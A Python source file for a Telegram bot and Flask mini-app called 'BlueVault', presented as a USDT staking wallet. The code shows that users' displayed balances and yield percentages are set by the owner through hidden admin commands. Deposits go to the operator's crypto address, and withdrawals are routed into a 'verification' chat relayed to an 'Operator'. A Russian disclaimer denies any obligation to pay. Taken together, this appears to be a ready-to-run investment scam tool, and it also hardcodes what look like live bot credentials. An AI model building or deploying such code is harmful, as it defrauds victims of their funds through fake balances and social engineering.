import asyncio
import logging
import os
import json
from datetime import datetime
from threading import Thread

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from flask import Flask, request, jsonify

# ====================== НАСТРОЙКИ ======================
API_ID = 8
API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
BOT_TOKEN = '8867073594:AAFf79ATdyNaAJQHtLWedIymQtRof01z1C8'
OWNER_ID = 1663746192
CRYPTO_ADDRESS = '0xYourAddress'
DEFAULT_PERCENT = 0

DATA_FILE = 'bluevault_data.json'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== ДАННЫЕ ======================
def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return data.get('balances', {}), data.get('percent', DEFAULT_PERCENT)
        except Exception as e:
            logger.error(f"Ошибка загрузки: {e}")
    return {}, DEFAULT_PERCENT

def save_data(balances, percent):
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump({
                'balances': balances,
                'percent': percent,
                'last_updated': datetime.now().isoformat()
            }, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения: {e}")

user_balances, current_percent = load_data()

# ====================== TELETHON ======================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

bot = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
app = Flask(__name__)

_handled = set()
verification_sessions = {}
last_message_time = {}

def is_duplicate(event):
    msg_id = getattr(event, 'id', None)
    if not msg_id:
        return False
    if msg_id in _handled:
        return True
    
    user_id = event.sender_id
    now = datetime.now().timestamp()
    key = f"{user_id}_{msg_id}"
    
    if key in last_message_time and now - last_message_time[key] < 2:
        return True
    
    last_message_time[key] = now
    _handled.add(msg_id)
    
    if len(_handled) > 30000:
        _handled.clear()
    if len(last_message_time) > 10000:
        last_message_time.clear()
    
    return False

# ====================== HTML ======================
HTML_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>BlueVault</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #0a1628; --card: #0f1f3d; --border: #1a3256; --blue: #2196F3; --blue-light: #64B5F6; --text: #E3F2FD; --text-secondary: #90CAF9; --green: #4CAF50; --red: #EF5350; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); padding: 16px; min-height: 100vh; }
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
        .logo { font-size: 20px; font-weight: 700; color: var(--blue-light); } .logo span { color: var(--blue); }
        .header-right { display: flex; align-items: center; gap: 10px; }
        .status { width: 8px; height: 8px; background: var(--green); border-radius: 50%; box-shadow: 0 0 6px var(--green); }
        .percent-badge { background: var(--card); border: 1px solid var(--blue); color: var(--blue-light); padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 700; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 12px; }
        .balance-label { font-size: 13px; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
        .balance-row { display: flex; align-items: baseline; gap: 8px; }
        .balance-value { font-size: 42px; font-weight: 700; color: #fff; line-height: 1; }
        .balance-usd { font-size: 14px; color: var(--text-secondary); margin-top: 6px; }
        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
        .btn { background: var(--card); border: 1px solid var(--border); color: var(--blue-light); padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; text-align: center; }
        .btn:active { background: var(--border); }
        .notice { background: var(--card); border: 1px solid var(--blue); border-radius: 12px; padding: 16px; text-align: center; color: var(--blue-light); font-size: 14px; margin-top: 12px; }
        .address-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 14px; font-size: 13px; word-break: break-all; color: var(--text-secondary); margin: 12px 0; font-family: monospace; }
        .divider { height: 1px; background: var(--border); margin: 16px 0; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">Blue<span>Vault</span></div>
        <div class="header-right">
            <div class="percent-badge" id="percentDisplay">0%</div>
            <div class="status" id="statusDot"></div>
        </div>
    </div>

    <div id="mainScreen">
        <div class="card">
            <div class="balance-label">Total Balance</div>
            <div class="balance-row">
                <div class="balance-value" id="balance">0.00</div>
                <div class="percent-badge" id="percentInline" style="font-size:16px;padding:6px 12px;">0%</div>
            </div>
            <div class="balance-usd">USDT</div>
            <div class="actions">
                <button class="btn" onclick="showStake()">↗ Stake</button>
                <button class="btn" onclick="showWithdraw()">↓ Withdraw</button>
            </div>
        </div>
    </div>

    <div id="stakeScreen" class="hidden">
        <div class="card">
            <div class="balance-label">Stake USDT</div>
            <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">Send USDT to the address below</p>
            <div class="address-box" id="cryptoAddress"></div>
            <button class="btn" onclick="copyAddress()" style="width:100%;background:var(--blue);color:#fff;">Copy Address</button>
            <div class="divider"></div>
            <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
        </div>
    </div>

    <div id="withdrawScreen" class="hidden">
        <div class="card">
            <div class="balance-label">Withdraw</div>
            <div class="notice">⚠ Complete verification using <b>/verify</b> in the bot</div>
            <div class="divider"></div>
            <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp; tg.expand(); tg.ready();
        const userId = tg.initDataUnsafe?.user?.id || 0;

        function updateBalance(){
            fetch('/get_balance?user_id='+userId)
            .then(r=>r.json())
            .then(d=>{
                document.getElementById('balance').textContent = parseFloat(d.balance).toFixed(2);
                document.getElementById('percentDisplay').textContent = d.percent + '%';
                document.getElementById('percentInline').textContent = d.percent + '%';
            })
            .catch(()=>{ document.getElementById('statusDot').style.background='var(--red)'; });
        }

        function showStake(){
            document.getElementById('mainScreen').classList.add('hidden');
            document.getElementById('stakeScreen').classList.remove('hidden');
            document.getElementById('withdrawScreen').classList.add('hidden');
            fetch('/get_address').then(r=>r.json()).then(d=>{document.getElementById('cryptoAddress').textContent=d.address});
        }

        function showWithdraw(){
            document.getElementById('mainScreen').classList.add('hidden');
            document.getElementById('stakeScreen').classList.add('hidden');
            document.getElementById('withdrawScreen').classList.remove('hidden');
        }

        function goBack(){
            document.getElementById('mainScreen').classList.remove('hidden');
            document.getElementById('stakeScreen').classList.add('hidden');
            document.getElementById('withdrawScreen').classList.add('hidden');
        }

        function copyAddress(){
            navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent).then(()=>{
                tg.showPopup({title:'Copied',message:'Address copied to clipboard'});
            });
        }

        updateBalance();
        setInterval(updateBalance, 15000);
    </script>
</body>
</html>'''

# ====================== FLASK ======================
@app.route('/')
def index():
    return HTML_PAGE

@app.route('/get_balance')
def get_balance():
    user_id = request.args.get('user_id')
    return jsonify({'balance': float(user_balances.get(str(user_id), 0)), 'percent': current_percent})

@app.route('/get_address')
def get_address():
    return jsonify({'address': CRYPTO_ADDRESS})

# ====================== ЕДИНЫЙ ОБРАБОТЧИК ======================
@bot.on(events.NewMessage(incoming=True))
async def handle_all_messages(event):
    if is_duplicate(event):
        return

    text = event.raw_text.strip()
    global current_percent

    if text == '/start':
        user_id = str(event.sender_id)
        user_balances.setdefault(user_id, 0)
        save_data(user_balances, current_percent)
        await event.respond('🛡 BlueVault Wallet\nℹ Use /about for project info', buttons=[
            [Button.url('🚀 Open App', 'https://t.me/BlueVaultt_bot/bluevallet')]
        ])

    elif text == '/about':
        await event.respond(
            'ℹ **About BlueVault**\n\n'
            '**1. Схема работы:** Участник предоставляет интерфейс доступа к бирже. Система (набор алгоритмов и трейдботов) анализирует данные и совершает тестовые транзакции. Любые положительные изменения на счёте — технический побочный эффект работы ИИ.\n\n'
            '**2. Доступ закрытый:** Проект не является публичной офертой. Доступ только по персональному приглашению. Логика алгоритмов не разглашается.\n\n'
            '**3. Отказ от ответственности:** Все действия алгоритмов носят экспериментальный характер. Разработчики не гарантируют никакого результата. Участник действует на свой риск. Изменения баланса не являются обязательством выплат со стороны BlueVault.\n\n'
            '**4. Благодарность:** Спасибо за использование BlueVault. Ваше участие помогает тестировать и дорабатывать алгоритмы нового поколения в реальных рыночных условиях.'
        )

    elif text.startswith('/setbalance') and event.sender_id == OWNER_ID:
        try:
            _, target_id, amount = text.split()
            target_id = str(target_id)
            user_balances[target_id] = float(amount)
            save_data(user_balances, current_percent)
            await event.respond(f'Balance {target_id}: {amount} USDT')
        except:
            await event.respond('/setbalance <id> <amount>')

    elif text.startswith('/setpercent') and event.sender_id == OWNER_ID:
        try:
            current_percent = int(text.split()[1])
            save_data(user_balances, current_percent)
            await event.respond(f'Percent set to {current_percent}%')
        except:
            await event.respond('/setpercent <number>')

    elif text == '/myid':
        await event.respond(f'Your ID: {event.sender_id}')

    elif text.startswith('/msg') and event.sender_id == OWNER_ID:
        try:
            parts = text.split(maxsplit=2)
            target_id = int(parts[1])
            message = parts[2] if len(parts) > 2 else ''
            await bot.send_message(target_id, message)
            await event.respond('Sent')
        except:
            await event.respond('/msg <id> <text>')

    elif text == '/verify':
        verification_sessions[event.sender_id] = True
        await event.respond('✅ Verification started. Send your messages below.')
        await bot.send_message(OWNER_ID, f'#VERIFY User {event.sender_id} started verification.')

    elif text.startswith('/reply') and event.sender_id == OWNER_ID:
        try:
            parts = text.split(maxsplit=2)
            target_id = int(parts[1])
            message = parts[2] if len(parts) > 2 else ''
            await bot.send_message(target_id, f'🛡 Operator: {message}')
            await event.respond('Replied')
        except:
            await event.respond('/reply <id> <text>')

    elif text.startswith('/endverify') and event.sender_id == OWNER_ID:
        try:
            target_id = int(text.split()[1])
            verification_sessions.pop(target_id, None)
            await bot.send_message(target_id, '✅ Verification completed.')
            await event.respond(f'Ended for {target_id}')
        except:
            await event.respond('/endverify <id>')

    elif event.sender_id in verification_sessions and text and not text.startswith('/'):
        await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {text}')

# ====================== ЗАПУСК ======================
async def main():
    try:
        logger.info("🔄 Подключение к Telegram...")
        await bot.start(
            bot_token=BOT_TOKEN,
            connection_retries=5,
            retry_delay=3,
            timeout=30,
            request_retries=5
        )
        logger.info("✅ Бот BlueVault успешно запущен и авторизован")
        await bot.run_until_disconnected()
    except Exception as e:
        logger.error(f"❌ Ошибка запуска бота: {type(e).__name__}: {e}", exc_info=True)
        await asyncio.sleep(10)
        raise

def run_bot():
    """Запуск Telethon в отдельном потоке"""
    try:
        loop.run_until_complete(main())
    except Exception as e:
        logger.error(f"Критическая ошибка в потоке бота: {e}", exc_info=True)

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"🚀 Запуск Flask на порту {port}")
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    # Для локального запуска (python bot.py)
    Thread(target=run_flask, daemon=True).start()
    run_bot()
else:
    # Для Gunicorn
    logger.info("Запуск под Gunicorn — запускаем бота в фоне")
    Thread(target=run_bot, daemon=True).start()
